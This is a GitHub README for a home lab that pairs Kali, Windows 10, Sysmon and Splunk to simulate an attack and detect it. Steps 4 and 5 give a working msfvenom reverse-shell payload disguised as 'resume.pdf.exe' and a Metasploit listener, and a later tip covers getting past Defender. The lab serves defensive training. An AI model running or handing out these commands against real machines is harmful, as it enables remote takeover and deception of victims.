
```markdown
# 🛡️ SOC Home Lab – Attack & Defense Simulation

Ever wanted to learn how cyberattacks work and how to catch them? This project walks you through building a small home lab using **Kali Linux**, **Windows 10**, and **Splunk** to simulate real-world attacks and monitor them like a Security Analyst. 💻🔍

---

## 📚 Table of Contents
1. [What's This Project About?](#whats-this-project-about)
2. [What You Need](#what-you-need)
3. [Network Setup Overview](#network-setup-overview)
4. [Step 1: Set Up Your Virtual Machines](#step-1-set-up-your-virtual-machines)
5. [Step 2: Install Splunk (Log Monitor)](#step-2-install-splunk-log-monitor)
6. [Step 3: Set Up Sysmon on Windows](#step-3-set-up-sysmon-on-windows)
7. [Step 4: Create Malware with msfvenom](#step-4-create-malware-with-msfvenom)
8. [Step 5: Launch Metasploit Listener](#step-5-launch-metasploit-listener)
9. [Step 6: Watch the Logs with Splunk](#step-6-watch-the-logs-with-splunk)
10. [Fixing Common Issues](#fixing-common-issues)
11. [What’s Next?](#whats-next)
12. [Want to Help Improve This?](#want-to-help-improve-this)
13. [Final Thoughts](#final-thoughts)

---

## 🔍 What's This Project About?
This lab is your **hands-on playground** to explore cyber attacks and defenses. You'll:
- Set up virtual machines (VMs)
- Simulate a real attack using `msfvenom` and `Metasploit`
- Track suspicious activity using **Sysmon** and **Splunk**

All of this is done safely, right on your personal computer.

---

## 🧰 What You Need

| Tool/Requirement      | Details                                       |
|----------------------|-----------------------------------------------|
| 💾 RAM               | At least 16 GB to run multiple VMs            |
| 🧱 Virtualization    | VMware or VirtualBox                          |
| 💿 OS Files         | Windows 10 ISO and Kali Linux ISO             |
| 🔎 Logging Tools     | Splunk (Free) and Sysmon                      |
| 🌐 Internet          | For downloading tools and updates             |

---

## 🌐 Network Setup Overview

```

[Kali Linux (Attacker)] → [Windows 10 (Target)] → [Splunk (Log Monitor)]

```

Kali sends the attack → Windows logs it → Splunk captures and shows it.

---

## ⚙️ Step 1: Set Up Your Virtual Machines

### 🐉 Kali Linux (Attacker)
1. Download it from [kali.org](https://www.kali.org/downloads/)
2. Install it using your VM software
3. Run:
   ```bash
   sudo apt update && sudo apt upgrade -y
```

### 🪟 Windows 10 (Target)

1. Get the ISO from [Microsoft](https://www.microsoft.com/en-us/software-download/windows10ISO)
    
2. Set it up in VMware/VirtualBox
    
3. Make sure both VMs can **talk to each other** via network
    

---

## 📦 Step 2: Install Splunk (Log Monitor)

1. Download **Splunk Free** from [splunk.com](https://www.splunk.com/)
    
2. Install it on Windows 10
    
3. Start it, sign in, and turn on log monitoring
    

---

## 🧠 Step 3: Set Up Sysmon on Windows

1. Get Sysmon from [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
    
2. Download a config file from [Sysmon Modular](https://github.com/olafhartong/sysmon-modular)
    
3. In PowerShell:
    
    ```powershell
    cd "C:\Users\Downloads\sysmon"
    .\sysmon64.exe -i sysmonconfig.xml
    Get-Process sysmon64
    ```
    

---

## 💣 Step 4: Create Malware with msfvenom

On Kali Linux, run:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -f exe -o resume.pdf.exe
```

This creates a fake `resume.pdf.exe` file you’ll run on the target.

---

## 📡 Step 5: Launch Metasploit Listener

On Kali:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Your_IP>
set LPORT 4444
exploit
```

Run the payload on the Windows VM. If it works, you’ll get a session like:

```bash
meterpreter > sysinfo
```

---

## 📊 Step 6: Watch the Logs with Splunk

Open Splunk and run:

```spl
index=main sourcetype=WinEventLog:Security
```

Look for anything unusual—process creation, network activity, etc.

---

## 🧯 Fixing Common Issues

### 🛑 No Meterpreter Session?

- Check if Windows Defender is blocking the payload
    
- Make sure IP and Port match in both Kali and Windows
    
- Run payload as Administrator
    

### 📉 Splunk Not Showing Logs?

- Restart Sysmon and Splunk
    
- Double-check if Splunk is monitoring the right log sources
    

---

## 🚀 What’s Next?

Want to take this even further? Try adding:

- 🧠 **ELK Stack** (Elastic, Logstash, Kibana)
    
- 🐍 **Python scripts** for automation
    
- 🔐 **Wazuh** for a complete SIEM experience
    

---

## 🤝 Want to Help Improve This?

Contributions are super welcome!

1. Fork this repo
    
2. Create a branch for your changes
    
3. Open a pull request ✨
    

### GitHub Repo Badges

![GitHub stars](https://img.shields.io/github/stars/Danishcx/SOC-Home-Lab-Attack-Defense-Simulation.svg)  
![GitHub forks](https://img.shields.io/github/forks/Danishcx/SOC-Home-Lab-Attack-Defense-Simulation.svg)  
![GitHub issues](https://img.shields.io/github/issues/Danishcx/SOC-Home-Lab-Attack-Defense-Simulation.svg)

---

## 🎬 Final Thoughts

This project teaches you:

- How cyberattacks work
    
- How to catch them with real-world tools
    
- How to set up a safe lab at home
    

> ⚠️ **Note:** For learning purposes only. Please don’t try any of this on systems you don’t own.

---

## 🙋‍♂️ Connect with Me

- 🔗 [LinkedIn](https://www.linkedin.com/in/danish-u-544061230/)
    
- 💻 [GitHub](https://github.com/Danishcx)
    

